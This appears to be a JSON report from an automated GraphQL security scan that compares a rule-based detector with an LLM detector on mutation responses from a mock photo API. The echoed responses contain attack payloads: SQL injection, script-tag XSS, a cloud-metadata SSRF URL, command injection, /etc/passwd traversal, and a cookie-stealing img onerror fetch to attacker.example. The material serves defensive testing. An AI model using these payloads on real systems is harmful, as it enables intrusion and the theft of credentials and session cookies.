{
  "report_timestamp": "2025-10-03T07:26:06.038804",
  "api_url": "https://graphqlzero.almansi.me/api",
  "summary": {
    "total_comparisons": 10,
    "agreement_rate": 0.4,
    "simple_detections": 6,
    "llm_detections": 5,
    "consensus_breakdown": {
      "simple_only": 1,
      "both_detected": 5,
      "no_vulnerabilities": 4
    },
    "detection_ratio": 0.8333333333333334,
    "potential_analysis": {
      "potential_agreement_rate": 0.0,
      "simple_potential_detections": 5,
      "llm_potential_detections": 1,
      "potential_consensus_breakdown": {
        "simple_potential_only": 5,
        "no_potential": 4,
        "llm_potential_only": 1
      },
      "potential_detection_ratio": 0.2
    }
  },
  "detailed_comparisons": [
    {
      "timestamp": "2025-10-03T07:23:50.111692",
      "node_name": "updatePhoto_response_2",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "title": "O'Reilly'; DROP TABLE users; --"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "SQL Injection (SQLi) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "SQL injection vulnerability detected - malicious SQL patterns found in response",
            "evidence": "Response status: 200, SQL patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Injection Attacks"
        ],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "simple_only",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-03T07:24:11.155152",
      "node_name": "updatePhoto_response_3",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "title": "<script>alert('xss')</script>"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Cross-Site Scripting (XSS) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "XSS injection vulnerability detected - malicious script patterns found in response",
            "evidence": "Response status: 200, XSS patterns detected in response data"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: xss_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The GraphQL response contains an unescaped script tag in the title field. Returning \"<script>alert('xss')</script>\" indicates that user-supplied or stored HTML/JS is being returned without encoding. If a client renders this value into the DOM as HTML (innerHTML, template rendering without escaping, etc.) it will execute, resulting in reflected or stored XSS. This is a high-risk issue because it enables arbitrary JavaScript execution in victims' browsers. To confirm exploitation, verify how the client inserts this field into the page. Mitigations: properly encode/escape output when inserting into HTML, sanitize or strip dangerous HTML on input or before storage, use safe templating APIs that auto-escape, and enforce a strict Content-Security-Policy (CSP).",
            "evidence": "data.updatePhoto.title = \"<script>alert('xss')</script>\"",
            "confidence": 0.9,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "xss_injection",
              "severity": "HIGH",
              "confidence": 0.9,
              "evidence": "data.updatePhoto.title = \"<script>alert('xss')</script>\"",
              "explanation": "The GraphQL response contains an unescaped script tag in the title field. Returning \"<script>alert('xss')</script>\" indicates that user-supplied or stored HTML/JS is being returned without encoding. If a client renders this value into the DOM as HTML (innerHTML, template rendering without escaping, etc.) it will execute, resulting in reflected or stored XSS. This is a high-risk issue because it enables arbitrary JavaScript execution in victims' browsers. To confirm exploitation, verify how the client inserts this field into the page. Mitigations: properly encode/escape output when inserting into HTML, sanitize or strip dangerous HTML on input or before storage, use safe templating APIs that auto-escape, and enforce a strict Content-Security-Policy (CSP)."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-03T07:24:25.332836",
      "node_name": "updatePhoto_response_4",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Server-Side Request Forgery (SSRF) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "SSRF injection vulnerability detected - internal network access patterns found",
            "evidence": "Response status: 200, SSRF keywords detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: ssrf_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The GraphQL response shows the updatePhoto mutation returning a URL that points to 169.254.169.254, the AWS instance metadata service (IMDS) endpoint. This is a strong indicator the server accepted and/or dereferenced a user-supplied URL that targets an internal-only address. If the application performs server-side requests to arbitrary URLs provided by clients (e.g., fetching images for updatePhoto), an attacker can induce requests to internal resources (IMDS, internal services), potentially exposing sensitive data such as IAM credentials or other internal metadata. Because access to the IMDS can lead to compromise of cloud credentials and broader account takeover, this is a critical SSRF risk. Recommended mitigations: enforce a strict allowlist of domains/IPs for remote fetches, block requests to link-local and metadata ranges (169.254.169.254/32) at the application and network egress level, validate and normalize user-supplied URLs, and perform server-side fetches from isolated network contexts with minimal privileges.",
            "evidence": "Response contains URL 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' returned by the updatePhoto mutation.",
            "confidence": 0.8,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "ssrf_injection",
              "severity": "CRITICAL",
              "confidence": 0.8,
              "evidence": "Response contains URL 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' returned by the updatePhoto mutation.",
              "explanation": "The GraphQL response shows the updatePhoto mutation returning a URL that points to 169.254.169.254, the AWS instance metadata service (IMDS) endpoint. This is a strong indicator the server accepted and/or dereferenced a user-supplied URL that targets an internal-only address. If the application performs server-side requests to arbitrary URLs provided by clients (e.g., fetching images for updatePhoto), an attacker can induce requests to internal resources (IMDS, internal services), potentially exposing sensitive data such as IAM credentials or other internal metadata. Because access to the IMDS can lead to compromise of cloud credentials and broader account takeover, this is a critical SSRF risk. Recommended mitigations: enforce a strict allowlist of domains/IPs for remote fetches, block requests to link-local and metadata ranges (169.254.169.254/32) at the application and network egress level, validate and normalize user-supplied URLs, and perform server-side fetches from isolated network contexts with minimal privileges."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-03T07:24:43.092660",
      "node_name": "updatePhoto_response_5",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "title": "cmd; /bin/ls -la /tmp > /tmp/out"
          }
        }
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-03T07:25:00.499351",
      "node_name": "updatePhoto_response_6",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "thumbnailUrl": "../../../../../etc/passwd"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Path Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "Path injection vulnerability detected - file system access patterns found",
            "evidence": "Response status: 200, Path injection patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: path_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The GraphQL response for updatePhoto returns a thumbnailUrl value containing a directory traversal payload ('../../../../../etc/passwd'). This is strong evidence of a path traversal/path injection issue: the application is exposing or using file system paths that resolve to sensitive local files (here /etc/passwd). If an attacker can control or influence this field, they may be able to cause the server to read arbitrary files or expose sensitive filesystem contents. Impact includes disclosure of system files and potentially sensitive data. Recommended mitigations: validate and canonicalize file paths on the server, disallow path traversal tokens (\"..\"), restrict file access to a safe, whitelisted directory, and never construct file paths from untrusted input.",
            "evidence": "\"thumbnailUrl\": \"../../../../../etc/passwd\"",
            "confidence": 0.85,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "path_injection",
              "severity": "HIGH",
              "confidence": 0.85,
              "evidence": "\"thumbnailUrl\": \"../../../../../etc/passwd\"",
              "explanation": "The GraphQL response for updatePhoto returns a thumbnailUrl value containing a directory traversal payload ('../../../../../etc/passwd'). This is strong evidence of a path traversal/path injection issue: the application is exposing or using file system paths that resolve to sensitive local files (here /etc/passwd). If an attacker can control or influence this field, they may be able to cause the server to read arbitrary files or expose sensitive filesystem contents. Impact includes disclosure of system files and potentially sensitive data. Recommended mitigations: validate and canonicalize file paths on the server, disallow path traversal tokens (\"..\"), restrict file access to a safe, whitelisted directory, and never construct file paths from untrusted input."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-03T07:25:13.770924",
      "node_name": "updatePhoto_response_7",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "title": "<img src=x onerror='fetch(\"https://attacker.example/steal?c=\"+document.cookie)'>"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "HTML Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "HTML injection vulnerability detected - HTML markup found in response",
            "evidence": "Response status: 200, HTML patterns detected in response data"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: html_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The GraphQL response contains an unescaped HTML img tag with an onerror JavaScript handler in the 'title' field. This is indicative of HTML injection (and effectively an XSS payload) — if a client (web page or other HTML-rendering consumer) inserts this 'title' value into the DOM without proper escaping or sanitization, the onerror handler will execute and perform a fetch to an attacker-controlled domain including document.cookie. Impact includes session token theft, account takeover, data exfiltration, and further client-side compromise. Recommended mitigations: properly escape or sanitize user-controlled values before including them in HTML, enforce a strong Content Security Policy (CSP), validate/encode output on the server, and apply input validation to disallow embedded markup where not expected.",
            "evidence": "data.updatePhoto.title = \"<img src=x onerror='fetch(\\\"https://attacker.example/steal?c=\\\"+document.cookie)'>\"",
            "confidence": 0.9,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "html_injection",
              "severity": "HIGH",
              "confidence": 0.9,
              "evidence": "data.updatePhoto.title = \"<img src=x onerror='fetch(\\\"https://attacker.example/steal?c=\\\"+document.cookie)'>\"",
              "explanation": "The GraphQL response contains an unescaped HTML img tag with an onerror JavaScript handler in the 'title' field. This is indicative of HTML injection (and effectively an XSS payload) — if a client (web page or other HTML-rendering consumer) inserts this 'title' value into the DOM without proper escaping or sanitization, the onerror handler will execute and perform a fetch to an attacker-controlled domain including document.cookie. Impact includes session token theft, account takeover, data exfiltration, and further client-side compromise. Recommended mitigations: properly escape or sanitize user-controlled values before including them in HTML, enforce a strong Content Security Policy (CSP), validate/encode output on the server, and apply input validation to disallow embedded markup where not expected."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-03T07:25:23.703041",
      "node_name": "updatePhoto_response_8",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-03T07:25:35.146300",
      "node_name": "updatePhoto_response_9",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-03T07:25:53.624782",
      "node_name": "updatePhoto_response_10",
      "response_status": 200,
      "response_body": {
        "data": {
          "updatePhoto": {
            "id": "1",
            "title": "Introspection attempt",
            "__typename": "Photo",
            "album": {
              "id": "1",
              "title": "quidem molestiae enim",
              "__typename": "Album"
            }
          }
        }
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-03T07:26:06.035871",
      "node_name": "updatePhoto_response_11",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Cannot query field \"titel\" on type \"Photo\". Did you mean \"title\"?",
            "locations": [
              {
                "line": 5,
                "column": 5
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          },
          {
            "message": "Cannot query field \"urll\" on type \"Photo\". Did you mean \"url\"?",
            "locations": [
              {
                "line": 6,
                "column": 5
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Field Suggestions Enabled",
            "detection": "vulnerable",
            "category": "Information Disclosure",
            "description": "Field suggestions enabled - potential information disclosure",
            "evidence": "Found \"did you mean\" in error message - field suggestions are enabled"
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Information Disclosure"
        ],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: field_suggestions",
            "detection": "potential",
            "category": "Unknown",
            "description": "The GraphQL error responses include automatic field-name suggestions (e.g., suggesting \"title\" and \"url\" when misspellings \"titel\" and \"urll\" were queried). This leaks schema information about available fields on the Photo type and makes it easier for an attacker to discover valid field names and map the API. While this is an information disclosure rather than direct code execution, it aids reconnaissance and can facilitate further attacks (enumeration, overfetching of sensitive fields, crafting targeted queries). Recommended mitigation: suppress or redact automatic suggestion text in production validation errors, return generic validation messages, and gate schema discovery via authentication/authorization or introspection controls.",
            "evidence": "Response errors: \"Cannot query field \\\"titel\\\" on type \\\"Photo\\\". Did you mean \\\"title\\\"?\" and \"Cannot query field \\\"urll\\\" on type \\\"Photo\\\". Did you mean \\\"url\\\"?\"",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "field_suggestions",
              "severity": "MEDIUM",
              "confidence": 0.95,
              "evidence": "Response errors: \"Cannot query field \\\"titel\\\" on type \\\"Photo\\\". Did you mean \\\"title\\\"?\" and \"Cannot query field \\\"urll\\\" on type \\\"Photo\\\". Did you mean \\\"url\\\"?\"",
              "explanation": "The GraphQL error responses include automatic field-name suggestions (e.g., suggesting \"title\" and \"url\" when misspellings \"titel\" and \"urll\" were queried). This leaks schema information about available fields on the Photo type and makes it easier for an attacker to discover valid field names and map the API. While this is an information disclosure rather than direct code execution, it aids reconnaissance and can facilitate further attacks (enumeration, overfetching of sensitive fields, crafting targeted queries). Recommended mitigation: suppress or redact automatic suggestion text in production validation errors, return generic validation messages, and gate schema discovery via authentication/authorization or introspection controls."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Unknown"
        ],
        "potential_categories": [
          "Unknown"
        ]
      },
      "comparison": {
        "total_categories": [
          "Information Disclosure",
          "Unknown"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Information Disclosure"
        ],
        "llm_unique_categories": [
          "Unknown"
        ],
        "agreement_score": 0.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Unknown"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [
            "Unknown"
          ],
          "potential_agreement_score": 0.0,
          "potential_consensus": "llm_potential_only"
        }
      }
    }
  ],
  "detector_analysis": {
    "simple_detector": {
      "description": "Rule-based detector using predefined patterns",
      "strengths": [
        "Fast execution",
        "Consistent results",
        "Low resource usage"
      ],
      "weaknesses": [
        "Limited to known patterns",
        "May miss novel attacks",
        "False negatives possible"
      ]
    },
    "llm_detector": {
      "description": "AI-powered detector using language model analysis",
      "strengths": [
        "Contextual understanding",
        "Novel attack detection",
        "Detailed analysis"
      ],
      "weaknesses": [
        "Slower execution",
        "Resource intensive",
        "Potential false positives"
      ]
    }
  }
}